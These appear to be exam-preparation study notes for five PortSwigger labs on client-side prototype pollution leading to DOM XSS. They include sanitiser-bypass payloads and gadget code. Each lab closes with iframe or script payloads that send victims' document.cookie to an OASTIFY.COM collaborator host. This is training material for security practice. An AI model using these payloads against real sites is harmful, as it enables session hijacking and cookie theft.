
#### 2.1. Lab: Client-side prototype pollution via browser APIs ⭕️
This lab is vulnerable to DOM XSS via client-side prototype pollution. The website's developers have noticed a potential gadget and attempted to patch it. However, you can bypass the measures they've taken.
To solve the lab:
1. Find a source that you can use to add arbitrary properties to the global `Object.prototype`.
2. Identify a gadget property that allows you to execute arbitrary JavaScript.
3. Combine these to call `alert()`.
You can solve this lab manually in your browser, or use [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader) to help you.
##### Manual Exploit
1. Find a prototype pollution source
	1. Appending the following payload in the URL of `/`: `/?__proto__[foo]=bar`.
	2. Inspect > Console > type: `Object.prototype` and if it returns `{foo: 'bar',...}` then we confirmed **Prototype pollution** on this app.
		1. ![[Prototype Pollution-20260111201346263.png|348]]
2. Identify a gadget
	1. Look in Sources and look for `searchLoggerConfigurable.js` and somehow this script the `transport_url` property is used to dynamically append a script to the DOM. **Specially, if `config.transport_url` is found, then the app is vulnerable**.
	```
	async function searchLogger() {
	    let config = {params: deparam(new URL(location).searchParams.toString()), transport_url: false};
	    Object.defineProperty(config, 'transport_url', {configurable: false, writable: false});
	    if(config.transport_url) {
	        let script = document.createElement('script');
	        script.src = config.transport_url;
	        document.body.appendChild(script);
	    }
	    if(config.params && config.params.search) {
	        await logQuery('/logger', config.params);
	    }
	}
	```
	2. Enter `/?__proto__[value]=foo` in the URL and Inspect > Elements and see that `<script src="foo"></script>` has been appended. That is our way in to *insert an XSS payload*.
		1. ![[Prototype Pollution-20260111202441607.png]]
3. Craft an exploit
	1. Solve the lab with `/?__proto__[value]=data:,alert(1);`.
		1. ![[Prototype Pollution-20260111202606522.png|289]]
##### Automated Exploit (DOM Invader)
1. Open Burp browser > DOM Invader extension > turn on prototype pollution 
	1. If already toggled on, toggle off then back on and reload 
2. Inspect > DOM Invader and we will see the vulnerable sources.
	1. ![[Prototype Pollution-20260111202853728.png]]
3. Click on the first `Scan for gadgets` and we'll see an alert. DOM Invader found the vulnerable sink.
	1. ![[Prototype Pollution-20260111202940702.png]]
4. Click Exploit and it'll insert a PoC **confirming a prototype pollution vulnerability leading to DOM XSS**.
	1. ![[Prototype Pollution-20260111203115889.png|339]]
>[!tip] How to Identify this Vulnerability?
>1. Manual method: insert payload in URL and see it reflected in Console
>	1. Look for `config.transport_url`
>2. Automated method: just run DOM Invader (prototype pollution ON)

**Deliver exploit to victim**
```
# fetch example
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?__proto__[value]=data:,fetch(`https%3a//OASTIFY.COM/c%3d`%2bdocument.cookie);"></iframe>

# document.location example
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?__proto__[value]=data:,document.location='https%3a//OASTIFY.COM/c%3d'%2bdocument.cookie"></iframe>
```

---
#### 2.2. Lab: DOM XSS via client-side prototype pollution ⭕️
This lab is vulnerable to DOM XSS via client-side prototype pollution. To solve the lab:
1. Find a source that you can use to add arbitrary properties to the global `Object.prototype`.
2. Identify a gadget property that allows you to execute arbitrary JavaScript.
3. Combine these to call `alert()`.
You can solve this lab manually in your browser, or use [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader) to help you.
##### Manual Method
>Same as the previous lab although the `js` file and payload is slightly different.
```
async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString())};

    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }

    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}
```
Payload to solve lab: `/?__proto__[transport_url]=data:,alert(1);`.
##### Automated Method
Literally same as the previous lab. Run DOM Invader and you'll get a PoC.

**Deliver exploit to victim**
```
# fetch example
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?__proto__[transport_url]=data:,fetch(`https%3a//OASTIFY.COM/c%3d`%2bdocument.cookie);"></iframe>

# document.location example
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?__proto__[transport_url]=data:,document.location='https%3a//OASTIFY.COM/c%3d'%2bdocument.cookie"></iframe>
```

---
#### 2.3. Lab: DOM XSS via an alternative prototype pollution vector ⭕️
This lab is vulnerable to DOM XSS via client-side prototype pollution. To solve the lab:
1. Find a source that you can use to add arbitrary properties to the global `Object.prototype`.
2. Identify a gadget property that allows you to execute arbitrary JavaScript.
3. Combine these to call `alert()`.
You can solve this lab manually in your browser, or use [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader) to help you.
##### Manual Method
>Same as the previous lab although the `js` file and payload is slightly different.
```
async function searchLogger() {
    window.macros = {};
    window.manager = {params: $.parseParams(new URL(location)), macro(property) {
            if (window.macros.hasOwnProperty(property))
                return macros[property]
        }};
    let a = manager.sequence || 1;
    manager.sequence = a + 1;

    eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');

    if(manager.params && manager.params.search) {
        await logQuery('/logger', manager.params);
    }
}
```
1. `eval()` sink found. `manager.sequence` property is passed to `eval()` but isn't defined. 
2. Enter this payload to solve the lab: `/?__proto__.sequence=alert(1)-`. *The extra dash `-` in this payload is required to work*.
##### Automated Method
1. Using DOM Invader to the point where you click `Exploit` doesn't solve the lab!
2. Need to add `-` at the end of the payload in the URL.
>[!tip] How to Identify this Vulnerability?
>1. Manual method: insert payload in URL and see it reflected in Console
>	1. Look for `eval()` and `manager.sequence` then add `-` at end of payload
>2. Automated method: just run DOM Invader (prototype pollution ON) then add `-` at the end of payload

**Deliver exploit to victim -- the `-` at the end is important**
```
# fetch example
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?__proto__.sequence=fetch('https%3a//OASTIFY.COM/c%3d'%2bdocument.cookie)-"></iframe>

# couldn't get document.location to work
# got /NaN error
```

---
#### 2.4. Lab: Client-side prototype pollution via flawed sanitization ⭕️ 
This lab is vulnerable to DOM XSS via client-side prototype pollution. Although the developers have implemented measures to prevent prototype pollution, these can be easily bypassed.
To solve the lab:
1. Find a source that you can use to add arbitrary properties to the global `Object.prototype`.
2. Identify a gadget property that allows you to execute arbitrary JavaScript.
3. Combine these to call `alert()`.
##### Manual Method
1. Enter `/?__proto__.foo=bar` in URL but running `Object.prototype` doesn't show `foo=bar` meaning `Object.prototype` hasn't been modified. Try the following alternatives:
	1. `/?__proto__[foo]=bar`
	2. `/?constructor.prototype.foo=bar`
	3. Still no dice
2. Go to Sources and find that `searchLoggerFiltered.js` has a `sanitizeKey()` function that is used in `deparamSanitised.js`. 
```
function sanitizeKey(key) {
    let badProperties = ['constructor','__proto__','prototype'];
    for(let badProperty of badProperties) {
        key = key.replaceAll(badProperty, '');
    }
    return key;
}
```
3. Try any of the following payloads in the URL and see that `Object.prototype` has been modified which **confirms a prototype pollution vulnerability**.
#ExamTip 
```
/?__pro__proto__to__[foo]=bar
/?__pro__proto__to__.foo=bar 
/?constconstructorructor[protoprototypetype][foo]=bar /?constconstructorructor.protoprototypetype.foo=bar
```
4. Look in `searchLogger.js` and the color is similar to a previous lab; it has `config.transport_url`.
	1. ![[Prototype Pollution-20260111210257818.png]]
5. Use this payload in the URL `/?__pro__proto__to__[transport_url]=foo` then check Inspect > Elements to see a `<script>` tag has been appended.
	1. ![[Prototype Pollution-20260111210451323.png]]
6. Use this to solve the lab: `/?__pro__proto__to__[transport_url]=data:,alert(1);`.
##### Automated Method
Use DOM Invader and solve like the previous labs.

**Deliver exploit to victim**
```
# fetch example
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?__pro__proto__to__[transport_url]=data:,fetch(`https%3a//OASTIFY.COM/c%3d`%2bdocument.cookie);"></iframe>

# document.location example
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?__pro__proto__to__[transport_url]=data:,document.location='https%3a//OASTIFY.COM/c%3d'%2bdocument.cookie"></iframe>
```

---

#### 2.5. Lab: Client-side prototype pollution in third-party libraries ⭕️
This lab is vulnerable to DOM XSS via client-side prototype pollution. This is due to a gadget in a third-party library, which is easy to miss due to the minified source code. Although it's technically possible to solve this lab manually, we recommend using [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution) as this will save you a considerable amount of time and effort.
To solve the lab:
1. Use DOM Invader to identify a prototype pollution and a gadget for DOM XSS.
2. Use the provided exploit server to deliver a payload to the victim that calls `alert(document.cookie)` in their browser.
This lab is based on real-world vulnerabilities discovered by PortSwigger Research. For more details, check out [Widespread prototype pollution gadgets](https://portswigger.net/research/widespread-prototype-pollution-gadgets) by [Gareth Heyes](https://portswigger.net/research/gareth-heyes).
-
3. Open the Burp browser > turn on `Prototype Pollution is on` > Reload
	1. ![[Prototype Pollution-20260109203237408.png|318]]
4. Inspect > DOM Invader and notice it found 2 sources in the `hash` property. Click Scan for gadgets and got a hit. DOM Invader successfully accessed the `setTimeout()` sink via the `hitCallback` gadget. **This confirms a prototype pollution vulnerability**.
	1. ![[Prototype Pollution-20260109203415835.png|636]]
	2. ![[Prototype Pollution-20260109203615895.png]]
5. Click Exploit. It will automatically generate a PoC and notice the payload in the URL and got a reflected XSS.
	1. ![[Prototype Pollution-20260109203702352.png|311]]
6. Exploit server and enter the below payload > Store > View exploit to try this on yourself. Got our own cookie. *Manually added that cookie in via Cookie Editor*.
```
<script>
    location="https://YOUR-LAB-ID.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29"
</script>
```
![[Prototype Pollution-20260109204137114.png|350]]
5. Deliver exploit to victim and solved. **In the BSCP exam, we'd want to get the administrator's session cookie with this attack**.

>[!tip] How to Identify this Vulnerability?
>Run DOM Invader with `prototype pollution is on` toggled.

**Deliver this exploit to victim**
```
# location example 
<script>
    location="https://YOUR-LAB-ID.web-security-academy.net/?#__proto__[hitCallback]=fetch(`https%3a//OASTIFY.COM/c%3d`%2bdocument.cookie)"
</script>

# iframe example
did not work due to "in a frame because it set 'X-Frame-Options' to 'sameorigin'"
```

- - -